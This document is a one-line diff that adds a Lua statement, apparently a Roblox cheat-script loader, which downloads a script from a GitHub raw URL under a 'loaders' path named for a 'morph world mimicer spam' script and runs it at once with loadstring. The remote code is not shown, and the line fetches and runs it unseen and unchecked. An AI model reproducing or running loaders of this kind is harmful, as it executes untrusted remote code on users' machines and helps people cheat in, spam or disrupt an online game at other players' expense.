@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/morph-world-mimicer-spam2-x9goyqbvjrj3ta.lua"))()
